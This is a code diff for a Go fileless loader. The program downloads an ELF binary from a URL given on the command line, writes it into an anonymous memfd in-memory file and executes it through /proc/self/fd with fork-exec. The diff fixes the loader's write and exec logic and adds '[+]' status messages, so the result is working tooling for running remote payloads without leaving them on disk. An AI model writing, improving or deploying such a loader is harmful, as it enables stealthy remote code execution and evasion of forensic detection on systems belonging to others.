@@ -15,27 +15,27 @@ import (
 
 // Create a MemFd pointer
 func MemfdCreate(name string) int {
-	fmt.Printf("Creating memfd %v", name)
+	fmt.Printf("[+] Creating memfd %v\n", name)
 	fd, err := unix.MemfdCreate(name, 0)
 	if err != nil {
-		fmt.Printf("MemfdCreate Error: %v", err)
+		fmt.Printf("MemfdCreate Error: %v\n", err)
 		unix.Exit(0)
 	}
-	fmt.Printf("FD is %v", fd)
+	fmt.Printf("[+] FD is %v\n", fd)
 	return fd
 }
 
 // Downloads ELF from URL
-func retrieveFile(url string) (response []byte) {
+func RetrieveFile(url string) (response []byte) {
 	resp, err := http.Get(url)
 	if err != nil {
-		fmt.Printf("Error Retrieving File : %v", err)
+		fmt.Printf("Error Retrieving File : %v\n", err)
 		unix.Exit(0)
 	}
 	defer resp.Body.Close()
 	body, err := io.ReadAll(resp.Body)
 	if err != nil {
-		print("Error Reading File : %v", err)
+		print("Error Reading File : %v\n", err)
 		unix.Exit(0)
 	}
 	return body
@@ -43,27 +43,26 @@ func retrieveFile(url string) (response []byte) {
 
 // Write Content
 func WriteToMemfd(fd int, content []byte) {
-	fmt.Printf("Writing to MemFd Pointer")
+	fmt.Printf("[+] Writing to MemFd\n")
 	filepath := fmt.Sprintf("/proc/self/fd/%v", fd)
-	f, err := os.OpenFile(filepath, os.O_APPEND|os.O_WRONLY, 0644)
-	if err != nil {
-		fmt.Printf("Error Opening File: %v", err)
+	if err := os.WriteFile(filepath, content, 0777); err != nil {
+		fmt.Printf("Error Opening File: %v\n", err)
 		unix.Exit(0)
-	}
-	_, err = fmt.Fprint(f, content)
-	if err != nil {
-		fmt.Printf("Error Writing to File: %v", err)
 	}
 }
 
 func ExecMemfd(fd int) {
-	pid, _, _ := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
-	if pid == 0 {
-		print("Executing Memfd Pointer")
-		filepath := fmt.Sprintf("/proc/self/fd/%v", fd)
-		args := [1]string{string(fd)}
-		unix.Exec(filepath, args[:], os.Environ())
+	fmt.Print("[+] Executing Memfd\n")
+	filepath := fmt.Sprintf("/proc/self/fd/%v", fd)
+	args := [1]string{filepath}
+	env := os.Environ()
+	attr := &syscall.ProcAttr{Dir: "/proc/self/fd", Env: env}
+	pid, err := syscall.ForkExec(filepath, args[:], attr)
+	if err != nil {
+		fmt.Printf("Error Forking Process : %v", err)
+		unix.Exit(0)
 	}
+	fmt.Printf("[+] PID Spawed : %v\n", pid)
 }
 
 func main() {
@@ -79,7 +78,7 @@ func main() {
 		unix.Exit(0)
 	}
 	url = os.Args[1]
-	elfContent = retrieveFile(url)
+	elfContent = RetrieveFile(url)
 
 	// Create fd and Inject Code
 	fd = MemfdCreate("psovaya")
